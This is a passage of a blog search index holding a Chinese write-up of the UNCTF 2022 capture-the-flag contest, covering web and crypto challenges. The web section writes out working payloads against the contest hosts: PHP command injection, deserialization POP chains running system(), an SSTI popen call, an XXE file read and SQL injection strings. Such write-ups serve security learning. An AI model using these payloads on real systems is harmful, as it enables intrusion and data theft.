<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2022/11/21/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/"/>
      <url>/2022/11/21/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="公开赛道-晴雨初雪"><a href="#公开赛道-晴雨初雪" class="headerlink" title="公开赛道-晴雨初雪"></a>公开赛道-晴雨初雪</h1><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB:"></a>WEB:</h1><h2 id="babyphp-中国人民公安大学"><a href="#babyphp-中国人民公安大学" class="headerlink" title="babyphp-中国人民公安大学"></a>babyphp-中国人民公安大学</h2><p>数组绕过sha1弱比较，用passthur代替system，tail代替cat，%09代替空格，*绕过flag</p><pre class=" language-http"><code class="language-http">POST /index.php/?code=passthru("tail%09/fla*"); HTTP/1.1<span class="token header-name keyword">Host:</span> 5a69fdf7-ea39-42fe-ae29-219fa319e7f8.node.yuzhian.com.cn<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Upgrade-Insecure-Requests:</span> 1<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded<span class="token header-name keyword">Content-Length:</span> 24a=0abc&amp;key1[]=1&amp;key2[]=2</code></pre><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps1.jpg"> </p><h2 id="ezgame-浙江师范大学"><a href="#ezgame-浙江师范大学" class="headerlink" title="ezgame-浙江师范大学"></a>ezgame-浙江师范大学</h2><p>打死boss得到flag</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps2.jpg"> </p><h2 id="我太喜欢bilibili大学啦–中北大学"><a href="#我太喜欢bilibili大学啦–中北大学" class="headerlink" title="我太喜欢bilibili大学啦–中北大学"></a>我太喜欢bilibili大学啦–中北大学</h2><p>直接搜索unctf</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps3.jpg"> </p><h2 id="ez2048-中南大学"><a href="#ez2048-中南大学" class="headerlink" title="ez2048-中南大学"></a>ez2048-中南大学</h2><p>没有删除环境变量，直接phpinfo.php搜索unctf</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps4.jpg"> </p><h2 id="ezunseri-西华大学"><a href="#ezunseri-西华大学" class="headerlink" title="ezunseri-西华大学"></a>ezunseri-西华大学</h2><p>pop链： _destruct()-&gt; _get()-&gt; _toString()-&gt; _invoke()-&gt; excute()</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Exec</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"1!5!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token string">"test123"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token punctuation">;</span>        <span class="token variable">$name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">class</span> <span class="token class-name">Login</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string">" JUST FOR FUN"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">=</span><span class="token string">"UNCTF"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token string">'3.1415926'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">key</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span><span class="token operator">=</span><span class="token string">"3.1415926"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">key</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">key</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">key</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">key</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token operator">=</span><span class="token string">"system('tac /fla*');"</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>然后把Exec类的变量数+3绕过wakeup</p><p> <img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221115195745979.png"></p><h2 id="302与深大-深圳大学"><a href="#302与深大-深圳大学" class="headerlink" title="302与深大-深圳大学"></a>302与深大-深圳大学</h2><p>因为题目链接会重定向，所以直接抓打开题目的包，然后根据题目要求修改请求包</p><pre class=" language-http"><code class="language-http">POST /?miku=puppy HTTP/1.1<span class="token header-name keyword">Host:</span> 01db829f-f626-4054-a820-0cbef08717fc.node.yuzhian.com.cn<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Upgrade-Insecure-Requests:</span> 1<span class="token header-name keyword">Cookie:</span> admin=true<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded<span class="token header-name keyword">Content-Length:</span> 10micgo=ikun</code></pre><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps5.jpg"> </p><h2 id="easy-upload-云南警官学院"><a href="#easy-upload-云南警官学院" class="headerlink" title="easy_upload-云南警官学院"></a>easy_upload-云南警官学院</h2><p>通过多次上传，发现只能上传png文件，直接上传png一句话木马</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps6.jpg"> </p><p> 在文件存储位置命令执行</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps7.jpg"> </p><p> 发现flag在&#x2F;home&#x2F;ctf&#x2F;flag</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps8.jpg"> </p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps9.jpg"> </p><h2 id="easy-ssti-金陵科技学院"><a href="#easy-ssti-金陵科技学院" class="headerlink" title="easy ssti-金陵科技学院"></a>easy ssti-金陵科技学院</h2><p>ctfshow ssti随便搜一个exp，发现找到假的flag</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps10.jpg"> </p><p>于是尝试动态变量</p><pre class=" language-http"><code class="language-http">POST /register HTTP/1.1<span class="token header-name keyword">Host:</span> 2a869ed1-77d6-4992-b8b8-e8733bb3a048.node.yuzhian.com.cn<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded<span class="token header-name keyword">Content-Length:</span> 101<span class="token header-name keyword">Origin:</span> http://2a869ed1-77d6-4992-b8b8-e8733bb3a048.node.yuzhian.com.cn<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Referer:</span> http://2a869ed1-77d6-4992-b8b8-e8733bb3a048.node.yuzhian.com.cn/<span class="token header-name keyword">Upgrade-Insecure-Requests:</span> 1user=={{x.__init__.__globals__['__builtins__'].eval('__import__("os").popen("env").read()')}}&amp;pwd=111</code></pre><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps11.jpg"> </p><h2 id="听说php有一个xxe-西南科技大学"><a href="#听说php有一个xxe-西南科技大学" class="headerlink" title="听说php有一个xxe-西南科技大学"></a>听说php有一个xxe-西南科技大学</h2><p> ctfshow xxe随便搜一个exp</p><pre class=" language-http"><code class="language-http">GET /dom.php HTTP/1.1<span class="token header-name keyword">Host:</span> 40e45f57-931f-4376-a7c2-146428824b2c.node.yuzhian.com.cn<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Upgrade-Insecure-Requests:</span> 1<span class="token header-name keyword">Content-Length:</span> 126&lt;?xml version="1.0"?>&lt;!DOCTYPE xml [&lt;!ENTITY xxe SYSTEM "file:///flag">]>&lt;paidx0>&lt;ctfshow>&amp;xxe;&lt;/ctfshow>&lt;/paidx0></code></pre><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps12.jpg"> </p><h2 id="随便注-云南警官学院"><a href="#随便注-云南警官学院" class="headerlink" title="随便注-云南警官学院"></a>随便注-云南警官学院</h2><p>经过尝试发现过滤了关键字，并且是报错注入，于是大写关键字绕过过滤</p><p>查询数据库名</p><p>id&#x3D;1’ AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))–+</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps13.jpg"> </p><p>查询表名</p><p>id&#x3D;1’ AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM infORmation_schema.tables WHERE table_schema&#x3D;’admin’),0x7e))–+</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps14.jpg"> </p><p>查询字段名</p><p>id&#x3D;1’ AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM infORmation_schema.columns WHERE table_name&#x3D;’haha’),0x7e))–+</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps15.jpg"> </p><p>然后无论怎么查询字段值都找不到flag，然后想到了load_file函数，于是搜了一个exp，稍微改一下</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps16.jpg"> </p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps17.jpg"> </p><p>因为flag没有完全显现，所以再次截取后半截</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps18.jpg"> </p><h2 id="babynode-云南大学"><a href="#babynode-云南大学" class="headerlink" title="babynode-云南大学"></a>babynode-云南大学</h2><pre class=" language-http"><code class="language-http">POST / HTTP/1.1<span class="token header-name keyword">Host:</span> 0046b0e6-ea49-4b38-8937-768ca72ddbc9.node.yuzhian.com.cn<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Upgrade-Insecure-Requests:</span> 1<span class="token header-name keyword">Content-Length:</span> 28<span class="token header-name keyword">Content-Type:</span> application/json<span class="token application/json"><span class="token punctuation">{</span><span class="token string">"__proto__"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"id"</span><span class="token punctuation">:</span><span class="token string">"unctf"</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span></code></pre><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps19.jpg"> </p><h2 id="poppop-中国人民公安大学"><a href="#poppop-中国人民公安大学" class="headerlink" title="poppop-中国人民公安大学"></a>poppop-中国人民公安大学</h2><p> pop链：_destruct()-&gt; _toString()-&gt; _call()</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span> <span class="token operator">=</span><span class="token string">"system('set');"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">key</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$key2</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">key2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">key2</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">abab</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">key</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>然后把A类变量数+3绕过wakeup</p><p> <img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221120152415893.png"></p><h2 id="我太喜欢bilibili大学啦修复版-中北大学"><a href="#我太喜欢bilibili大学啦修复版-中北大学" class="headerlink" title="我太喜欢bilibili大学啦修复版-中北大学"></a>我太喜欢bilibili大学啦修复版-中北大学</h2><p> 直接搜索hint得到hint_1，base64解码得到admin_unctf.php</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps21.jpg"> </p><p>访问admin_unctf.php，查看源代码，发现</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221120104739316.png" alt="image-20221120104739316"></p><p>于是bp抓包，发现hint_2，base64解码得到unctf2022&#x2F;unctf2022</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps22.jpg"> </p><p>于是直接登录，base64解码得到flag</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps23.jpg"> </p><h2 id="给你一刀-西南科技大学"><a href="#给你一刀-西南科技大学" class="headerlink" title="给你一刀-西南科技大学"></a>给你一刀-西南科技大学</h2><p>thinkphp v5著名漏洞，直接随便搜一个poc</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221116113850955.png"></p><h2 id="Sqlsql-中国人民公安大学："><a href="#Sqlsql-中国人民公安大学：" class="headerlink" title="Sqlsql-中国人民公安大学："></a>Sqlsql-中国人民公安大学：</h2><p>随便取个姓名和学号注册、登录，做完题后查看成绩显示</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221120162324306.png"></p><p>猜测用admin登录后查看成绩就能得到flag</p><p>但是注册页面用admin注册显示</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221120162601809.png"></p><p>登录界面我们又不知道admin的学号，所以想到尝试用insert语句修改admin的学号</p><p>打开源码</p><p>注册页面发现表名为users，有三个字段</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221120180755105.png"></p><p>然后寻找注入点，发现登陆和注册页面都对输入做了过滤，只有提交成绩时没有过滤</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221120174352679.png"></p><p>于是在做题界面做完题提交时抓包，修改变量，使用堆叠注入插入insert语句</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221120181129470.png"></p><p>使用admin，123456登陆并查看成绩</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221117222542638.png"></p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221120174605608.png"></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO:"></a>CRYPTO:</h1><h2 id="md5-1-西南科技大学"><a href="#md5-1-西南科技大学" class="headerlink" title="md5-1-西南科技大学"></a>md5-1-西南科技大学</h2><p>直接把所有密文拿去md5解密得到flag</p><h2 id="md5-2-西南科技大学"><a href="#md5-2-西南科技大学" class="headerlink" title="md5-2-西南科技大学"></a>md5-2-西南科技大学</h2><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps25.jpg"> </p><p>解出来后一个个md5解密</p><h2 id="dddd-西南科技大学"><a href="#dddd-西南科技大学" class="headerlink" title="dddd-西南科技大学"></a>dddd-西南科技大学</h2><p>把1转化成.,把0转化成-,把&#x2F;转化成 ,直接摩斯密码解密，再url解码</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps26.jpg"> </p><h2 id="Single-table-西南科技大学"><a href="#Single-table-西南科技大学" class="headerlink" title="Single table-西南科技大学"></a>Single table-西南科技大学</h2><p> 普莱菲尔密码稍微修改</p><p><a href="https://rumkin.com/tools/cipher/playfair/%E5%9C%A8%E7%BA%BF%E8%A7%A3%E5%AF%86">https://rumkin.com/tools/cipher/playfair/在线解密</a></p><p><img 